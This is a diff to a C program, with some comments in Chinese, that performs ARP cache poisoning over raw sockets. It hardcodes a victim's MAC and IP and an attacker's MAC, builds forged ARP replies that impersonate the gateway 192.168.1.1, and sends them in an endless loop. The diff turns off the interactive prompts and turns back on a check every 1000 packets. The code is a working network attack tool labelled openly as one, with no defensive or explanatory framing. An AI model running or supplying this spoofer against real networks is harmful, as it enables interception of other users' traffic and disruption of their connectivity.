@@ -1,9 +1,9 @@
 #include "head.h"
 
 char *INTERFACE; //存储网卡设备
-u_char TARGET_MAC[6]; //victim's mac
-u_char SOURCE_MAC[6]; //attacker's mac
-u_char TARGET_IP[4]; //victim's ip
+u_char TARGET_MAC[6] = {0x74,0x29,0xaf,0x0f,0x09,0xe1}; //victim's mac
+u_char SOURCE_MAC[6] = {0x00,0xc2,0xc6,0xb9,0x4d,0x80}; //attacker's mac
+u_char TARGET_IP[4] = {192,168,1,223}; //victim's ip
 u_char SOURCE_IP[4] = {192,168,1,1}; //gateway's ip
 char errbuf[PCAP_ERRBUF_SIZE] = {0}; //存储错误信息
 
@@ -25,12 +25,12 @@ int main(int argc, char const *argv[]) {
         exit(1);
     }
     printf("Device: %s\n", INTERFACE);
-    printf("Your victim's MAC: ");
+    /*printf("Your victim's MAC: ");
     input_mac(TARGET_MAC);
     printf("Your victim's IP: ");
     input_ip(TARGET_IP);
     printf("Your MAC: ");
-    input_mac(SOURCE_MAC);
+    input_mac(SOURCE_MAC);*/
     //创建套接字
     int soc;
     u_char frame[42]; //以太网头部和ARP头部总长
@@ -54,7 +54,7 @@ int main(int argc, char const *argv[]) {
     arphead.protocol_type = htons(EPT_IPv4);
     arphead.hardware_len = 6;
     arphead.protocol_len = 4;
-    arphead.aro_op = htons(ARPOP_REPLY);
+    arphead.arp_option = htons(ARPOP_REPLY);
     memcpy(arphead.src_mac, SOURCE_MAC, 6);
     memcpy(arphead.src_ip, SOURCE_IP, 4);
     memcpy(arphead.dest_mac, TARGET_MAC, 6);
@@ -76,22 +76,22 @@ int main(int argc, char const *argv[]) {
     //发送数据包
     printf("Attacking!\n");
     loading();
-    int i;
+    int i = 0;
     char choose;
     while(1) {
         if(sendto(soc, frame, sizeof(frame), 0, (struct sockaddr *)&destaddr, sizeof(destaddr)) == -1) {
         perror("sendto() failed\n");
         exit(EXIT_FAILURE);
     }
-    printf("* Packet %d sent.\n", ++i);
-        /*if (i % 1000 == 0) {
+    printf("Packet %d sent.\n", ++i);
+        if (i % 1000 == 0) {
             printf("Do you want to send another 1000 packets to your victim? Y/N\n");
-            getchar();
+            /*getchar();*/
             scanf("%c", &choose);
             if (choose != 'Y' && choose != 'y') break;
-        }*/
+        }
     }
     close(soc);
-    printf("* Socket closed.\n");
+    printf("Socket closed.\n");
     return 0;
 }
